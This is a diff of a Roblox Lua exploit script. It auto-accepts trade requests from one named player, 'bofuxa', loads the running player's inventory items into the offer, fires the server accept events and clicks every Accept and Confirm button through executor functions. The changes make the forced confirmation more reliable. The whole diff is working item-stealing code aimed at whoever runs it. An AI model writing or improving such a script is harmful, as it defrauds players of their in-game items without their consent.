@@ -17,6 +17,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
     if senderName:lower() == "bofuxa" then
         print("Trade request verified from bofuxa. Accepting...")
         
+        -- Make sure TradeGUI elements are visible so the buttons exist and can be clicked/interacted with
         local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
         if playerGui then
             local tradeGui = playerGui:FindFirstChild("TradeGUI")
@@ -24,7 +25,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 for _, childName in ipairs({"Container", "Processing", "BG"}) do
                     local element = tradeGui:FindFirstChild(childName)
                     if element then
-                        element.Visible = false
+                        element.Visible = true -- Ensuring visibility so buttons are interactive
                     end
                 end
             end
@@ -108,18 +109,18 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
             end
 
-            print("Waiting 7 seconds before triggering trade accept actions...")
-            task.wait(7)
+            print("Waiting 3 seconds before triggering Accept and Confirm...")
+            task.wait(3)
 
-            if firesignal and AcceptTradeEvent.OnClientEvent then
-                firesignal(AcceptTradeEvent.OnClientEvent, false)
-            else
+            -- Fire server-side trade acceptance events
+            pcall(function()
+                AcceptTradeEvent:FireServer(true)
+            end)
+            pcall(function()
                 AcceptTradeEvent:FireServer()
-            end
+            end)
 
-            local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
-            local actionsFolder = tradeGui and tradeGui:FindFirstChild("Container", true) and tradeGui.Container:FindFirstChild("Trade", true) and tradeGui.Container.Trade:FindFirstChild("Actions", true)
-
+            -- Automatically find and press the Accept and Confirm buttons on mobile UI
             local function fireButton(btn)
                 if btn and btn:IsA("GuiButton") then
                     if getconnections then
@@ -136,14 +137,20 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 end
             end
 
-            if actionsFolder then
-                local firstButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("ActionButton", true)
-                fireButton(firstButton)
-
-                task.wait(1)
-
-                local confirmButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("Confirm", true) and actionsFolder.Accept.Confirm:FindFirstChild("ActionButton", true)
-                fireButton(confirmButton)
+            -- Target exact paths for TradeGUI buttons
+            if playerGui then
+                local tradeGui = playerGui:FindFirstChild("TradeGUI")
+                if tradeGui then
+                    -- Search specifically for Accept and Confirm action buttons
+                    for _, gui in ipairs(tradeGui:GetDescendants()) do
+                        if gui:IsA("GuiButton") then
+                            local fullName = gui:GetFullName():lower()
+                            if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
+                                fireButton(gui)
+                            end
+                        end
+                    end
+                end
             end
         end)
 
